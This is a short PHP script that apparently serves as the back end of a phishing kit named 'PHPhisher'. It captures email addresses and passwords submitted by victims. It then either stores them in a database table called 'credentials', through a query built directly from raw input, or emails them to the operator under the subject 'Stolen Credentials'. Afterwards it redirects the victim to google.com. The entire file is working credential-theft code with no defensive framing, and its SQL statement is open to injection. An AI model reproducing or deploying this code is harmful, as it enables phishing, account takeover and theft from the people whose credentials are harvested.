<?php
$json = json_decode(file_get_contents("config.json"), true);
$dbuser = $json['dbuser'];
$servername = $json['dbip'];
$dbpass = $json['dbpass'];
$dbname = $json['dbname'];
$redirect = $json['page-redirect'];
$password = $_GET['password'];
$email = $_GET['email'];
switch ($json['page']) {
    case "1": 
	try {
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $dbuser, $dbpass);
    // set the PDO error mode to exception
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $sql = "INSERT INTO credentials (email, password)
    VALUES ('$email', '$password')";
    // use exec() because no results are returned
    $conn->exec($sql);
    echo "New record created successfully";
	
    }
	catch(PDOException $e)
    {
    echo $sql . "<br>" . $e->getMessage();
    }
	$conn = null;
	break;
    case "2": 
	$subject ="Stolen Credentials";
	$message="Email: $email \nPassword: $password";
	$header="from: PHPhisher";
	$to = $json['email'];
	mail($to,$subject,$message,$header);
	break;
}
echo '<script script type="text/javascript">';
echo 'window.location.href = "http://google.com";'; 
echo '</script>';
?>